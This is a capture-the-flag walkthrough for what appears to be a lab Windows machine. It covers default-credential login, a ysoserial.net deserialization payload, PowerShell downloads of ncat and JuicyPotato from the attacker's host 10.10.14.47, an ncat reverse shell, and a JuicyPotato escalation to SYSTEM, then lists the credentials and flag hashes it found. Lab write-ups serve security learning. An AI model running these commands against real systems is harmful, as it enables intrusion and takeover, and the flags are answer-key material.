@@ -1,0 +1,32 @@
+We have a lot of open ports, but the only one important for now is port 80.
+When we first enter on this page we get an interesting thing, we first see the dashboard and than the login page appears. So let's intercept it with burp. And we get some names.
+Now let's try some default credentials and admin:admin works :))) 
+Intercepting the request on burp we get the oAuth2 token. 
+Deserializing the app.js we get that we should send it to /api/Account as Bearer ( see request.txt ) 
+Now let's use ysoserial.net to craft the payloads. 
+First we upload the ncat.exe to the box. [ powershell.exe -c "Invoke-WebRequest \"\\10.10.14.47\zaBogdan\ncat.exe\" -OutFile \"C:\Windows\System32\spool\drivers\color\ncat.exe\"" ]
+With the reverse shell tool we can create one [ cmd /c C:\Windows\System32\spool\drivers\color\ncat.exe 10.10.14.47 4444 -e cmd.exe ]
+And for both we use the same command to get the token [ cat command.txt | .\ysoserial.exe -o base64 -g WindowsIdentity  -f Json.Net -s ]. See files `get_necat.base64` and `get_shell.base64`
+And now we got the user!
+
+Heading to root!
+From the `whoami /all` we get that `SeImpersonatePrivilege` is enabled so we can use JuicyPotato.  
+We downlaod JuicyPotato to the box [ powershell.exe -c "Invoke-WebRequest \"\\10.10.14.47\zaBogdan\JuicyPotato.exe\" -OutFile \"C:\Windows\System32\spool\drivers\color\JuicyPotato.exe\"" ]
+Craft the payload that starts a reverse shell on the machine. Also we should upload it.  [ powershell.exe -c "Invoke-WebRequest \"\\10.10.14.47\zaBogdan\pleasesubscribe.bat\" -OutFile \"C:\Windows\System32\spool\drivers\color\pleasesubscribe.bat\"" ]
+Than just run JuicyPotato and we get the root. [ JuicyPotato.exe -t * -p pleasesubscribe.bat -l 9002 -c {e60687f7-01a1-40aa-86ac-db1cbf673334} ]
+
+Rooted.
+
+Users:  
+-> admin:admin
+-> puppet:sunshine
+-> ansible:superman 
+
+Flags:
+-> USER: 34459a01f50050dc410db09bfb9f52bb
+-> ROOT: 3cc85d1bed2ee84af4074101b991d441
+
+Articles:
+-> https://github.com/pwntester/ysoserial.net
+-> https://github.com/ohpe/juicy-potato/releases
+-> http://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/
